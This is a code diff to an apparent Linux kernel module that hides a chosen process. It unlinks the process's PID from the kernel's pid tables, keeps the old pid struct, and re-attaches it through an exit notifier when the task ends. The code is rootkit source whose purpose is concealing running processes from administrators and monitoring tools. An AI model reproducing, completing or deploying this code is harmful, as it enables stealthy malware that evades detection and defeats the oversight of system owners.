@@ -11,21 +11,45 @@
 #endif
 
 
-
 //#include "doExitHijack.h"
 
 
 // prototypes for functions from pid.c
-static void __change_pid(struct task_struct *task, enum pid_type type, struct pid *new);
-void detach_pid(struct task_struct *task, enum pid_type type);
-void change_pid(struct task_struct *task, enum pid_type type,
-		struct pid *pid);
+
+static struct pid *__changePidAndGetOldPid(struct task_struct *task, enum pid_type type, struct pid *new);
+struct pid *detachPidAndGetOldPid(struct task_struct *task, enum pid_type type);
+static struct pid *changePidAndGetOldPid(struct task_struct *task, enum pid_type type, 	struct pid *pid);
 void free_pid(struct pid *pid);
 static int hideProcess(int pidNumber);
 
+static void *hiddenTask = NULL;
+struct pid *oldPidToRestore = NULL;
 
 int notificationFunction(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task) {
-	printInfo("in notification function for exit :)\n");
+	//printInfo("in notification function for exit - task is %p\n", task);
+	if (task == hiddenTask) {
+		printInfo("FOUND PID THAT WAS HIDDEN");
+
+		{
+			//TODO: check which pid type to restore - this may put too many in..
+			struct pid *pid = oldPidToRestore;
+			rcu_read_lock(); 	//TODO: hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
+
+			attach_pid(task, PIDTYPE_MAX, pid);
+			attach_pid(task, PIDTYPE_PGID, pid);
+			attach_pid(task, PIDTYPE_PID, pid);
+			attach_pid(task, PIDTYPE_SID, pid);
+
+			rcu_read_unlock();
+		}
+
+		//TODO: restore oldPidToRestore
+
+
+		hiddenTask = NULL;
+	}
+
+
 	return 0;
 }
 struct notifier_block notificationOnProcessExit = {
@@ -50,9 +74,6 @@ int processHider_init(void) {
 	if (error != 0) { //todo : extract function..
 		return error;
 	}
-
-
-
 	return 0;
 }
 
@@ -68,6 +89,7 @@ void processHider_exit(void) {
 
 
 //returns error code...
+//PRESENTLY ONLY SUPPORTS HIDING ONE PROCESS
 static int hideProcess(int pidNumber) {
 	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...
 	if (pid == NULL) {
@@ -78,8 +100,13 @@ static int hideProcess(int pidNumber) {
 	
 	{
 		struct task_struct *task = pid_task(pid, PIDTYPE_PID);
+
+		if (hiddenTask != NULL) {
+			printInfo("warning another task was already hidden - this is not supported properly yet\n");
+		}
+		hiddenTask = task;
 		
-		detach_pid(task, PIDTYPE_PID);
+		oldPidToRestore = detachPidAndGetOldPid(task, PIDTYPE_PID);
 	}
 	
 	rcu_read_unlock();
@@ -107,36 +134,41 @@ void attach_pid(struct task_struct *task, enum pid_type type,
 
 
 
-static void __change_pid(struct task_struct *task, enum pid_type type,
+static struct pid *__changePidAndGetOldPid(struct task_struct *task, enum pid_type type,
 			struct pid *new)
 {
 	struct pid_link *link;
-	struct pid *pid;
+	struct pid *oldPid;
 	int tmp;
 
 	link = &task->pids[type];
-	pid = link->pid;
+	oldPid = link->pid;
 
 	hlist_del_rcu(&link->node);
 	link->pid = new;
 
+	//TODO: store each old pid to enable them to be stored as is....
 	for (tmp = PIDTYPE_MAX; --tmp >= 0; )
-		if (!hlist_empty(&pid->tasks[tmp]))
-			return;
+		if (!hlist_empty(&oldPid->tasks[tmp]))
+			return oldPid;
 
-	free_pid(pid);
+
+	// don't free so that it can be assigned again later
+	//free_pid(oldPid);
+	return oldPid;
 }
 
-void detach_pid(struct task_struct *task, enum pid_type type)
+struct pid *detachPidAndGetOldPid(struct task_struct *task, enum pid_type type)
 {
-	__change_pid(task, type, NULL);
+	return __changePidAndGetOldPid(task, type, NULL);
 }
 
-void change_pid(struct task_struct *task, enum pid_type type,
+struct pid *changePidAndGetOldPid(struct task_struct *task, enum pid_type type,
 		struct pid *pid)
 {
-	__change_pid(task, type, pid);
+	struct pid *oldPid =__changePidAndGetOldPid(task, type, pid);
 	attach_pid(task, type, pid);
+	return oldPid;
 }
 
 
